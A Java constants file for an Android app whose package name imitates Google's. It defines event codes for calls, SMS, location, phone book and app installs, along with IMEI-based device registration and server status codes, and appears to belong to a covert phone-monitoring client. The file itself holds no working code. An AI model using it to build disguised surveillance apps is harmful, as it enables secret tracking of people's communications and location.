package com.google.android.apps.utils;

/**
 * Created by OldMan on 05.04.2017.
 */

public class Constants {
    public final static int DIAGNOSTIC_PACKAGE = 1;
    public final static int INCOMING_CALL = 22;
    public final static int OUTGOING_CALL = 3;
    public final static int MISSED_CALL = 4;
    public final static int INCOMING_SMS = 5;
    public final static int OUTGOING_SMS = 6;
    public final static int LOCATION = 7;
    public final static int SERVICE_EVENT = 8;
    public final static int PHONE_BOOK = 9;
    public final static int INSTALL_APP = 10;

    enum EVENT {Device, Battery_state, Network}

    /*
   for periodical request
    */
    public final static int STATE_ERROR = 0;
    public final static int STATE_OK = 1;
    public final static int STATE_NEW_SETTINGS = 2;
    public final static int STATE_REMOVED = 3;
    /*
      if error
       */
    public final static int BAD_IMEI = 1;
    public final static int BAD_TYPE = 2;
    public final static int BAD_MODE_FOR_DELETE = 3;
    public final static int OTHER_ERROR = 4;

    public final static int ERROR_ON_SERVER = 0;
    public final static int BAD_REQUEST= 1;
    public final static int NOT_FOUND_DEVICE = 2;
    public final static int NOT_FOUND_DEVICES = 3;
    public final static int DEVICE_ALREADY_REGISTERED = 4;
    public final static int DATA_NOT_AVAILABLE= 5;

    public final static int GPS_PROVIDER = 0;
    public final static int NETWORK_PROVIDER = 1;
    public final static int PASSIVE_PROVIDER = 2;
}
